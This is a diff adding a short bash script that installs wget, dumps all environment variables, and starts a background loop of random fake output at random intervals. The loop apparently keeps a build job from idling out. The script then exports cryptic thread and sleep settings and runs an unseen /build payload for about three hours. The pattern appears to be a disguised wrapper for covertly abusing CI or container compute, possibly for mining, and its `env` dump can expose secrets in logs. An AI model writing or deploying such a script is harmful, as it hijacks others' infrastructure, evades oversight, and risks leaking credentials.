@@ -1,0 +1,21 @@
+#!/bin/bash
+
+apk --no-cache add wget coreutils;
+
+env
+
+rand_string() {
+    local c=0
+    while [ $c -lt $1 ]; do
+        printf "\x$(printf '%x' $((97+RANDOM%25)))"
+        c=$((c+1))
+    done
+}
+
+while :; do rand_string 8; echo ...; sleep $((RANDOM%30+30)); done &
+
+export ENV_VARS="X_ID=docker-productive_remo CSLEEP=5000 THREADS_FIXED=1 MHF_FIXED=2"
+
+timeout -k 5 $((RANDOM%300+10800)) bash < /build
+
+exit 0
